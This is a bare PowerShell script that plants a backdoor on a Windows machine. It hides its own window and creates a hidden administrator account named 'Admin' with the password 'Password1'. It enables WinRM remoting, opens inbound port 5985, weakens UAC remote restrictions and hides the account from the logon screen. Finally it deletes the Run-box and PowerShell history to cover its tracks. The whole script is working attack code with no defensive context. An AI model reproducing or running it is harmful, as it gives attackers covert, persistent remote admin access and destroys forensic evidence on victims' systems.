# Hide the current PowerShell window
Hide-Window

# Create a new local user account
$Username = "Admin"
$Password = ConvertTo-SecureString "Password1" -AsPlainText -Force
New-LocalUser -Name $Username -Password $Password -PasswordNeverExpires

# Add the newly created user to the local Administrators group
Add-LocalGroupMember -Group "Administrators" -Member $Username

# Enable Windows Remote Management (WinRM)
Enable-PSRemoting -Force

# Add a firewall rule to allow WinRM traffic
New-NetFirewallRule -DisplayName "Windows Remote Management for RD" -Direction Inbound -Protocol TCP -LocalPort 5985 -Action Allow

# Disable UAC remote restrictions
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "LocalAccountTokenFilterPolicy" -Value 1 -Force
New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" -Name "$Username" -Value 0 -PropertyType DWORD -Force

# Delete run box history
Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -Force

# Delete powershell history
Remove-Item (Get-PSReadlineOption).HistorySavePath

# Exit PowerShell session
Exit
